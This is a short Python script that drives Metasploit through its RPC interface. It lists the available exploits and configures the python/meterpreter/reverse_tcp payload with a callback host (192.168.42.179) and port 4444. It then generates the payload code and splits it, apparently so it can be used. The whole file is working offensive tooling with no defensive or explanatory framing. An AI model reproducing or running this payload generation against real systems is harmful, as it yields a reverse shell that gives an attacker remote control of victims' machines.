from pymetasploit3.msfrpc import MsfRpcClient
import base64, sys

client = MsfRpcClient('pass') # creation a connexion instance with the password 
#client.modules.exploits #renvoie la liste de tous les exploits disponibles
#client.modules.payloads #renvoie la liste de tous les payloads disponibles
exploit = client.modules.use('payload', 'python/meterpreter/reverse_tcp') #use the paylaod (or exploits) then precise the name you want
with open('test.txt', 'w') as file:
    for ele in client.modules.exploits:
        file.write(ele+'\n')
    file.close()

exploit.missing_required # print the required values missing
exploit.options # print the options

exploit['LHOST'] = '192.168.42.179' #set lhost
exploit['LPORT'] = 4444 #set lport

code = exploit.execute(payload='python/meterpreter/reverse_tcp') #returns the shellcode to use
shellcode = code['payload'].split(';')
